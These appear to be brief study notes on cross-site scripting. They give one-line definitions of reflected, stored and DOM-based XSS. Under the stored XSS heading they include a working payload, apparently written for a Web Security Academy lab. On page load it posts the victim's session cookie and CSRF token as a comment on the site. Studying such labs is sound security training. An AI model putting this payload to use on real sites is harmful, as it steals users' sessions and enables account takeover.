# Cross-Site scripting 


## Reflected XSS
The malicious script comes from the current HTTP request.

## Stored XSS
The malicious script comes from the website's database.

```html
</p><script>

window.onload = function exampleFunction() {
  fetch('https://aca71f681f59794b806d32780018002c.web-security-academy.net/post/comment',
  {method:'POST',
  mode:'cors',
  cache:'no-cache',
  credentials:'same-origin',
  headers:{},
  redirect:'follow',
  referrerPolicy:'no-referrer',
  body:'csrf='+document.getElementsByName('csrf')[0].value+'&postId=2&comment='+document.cookie+'&name=test&email=http://test%40gmail.com&website=http://www.google.es'

});}</script><p>ScriptHere

```


## DOM-based XSS
The vulnerability exists in client-side code rather than server-side code.


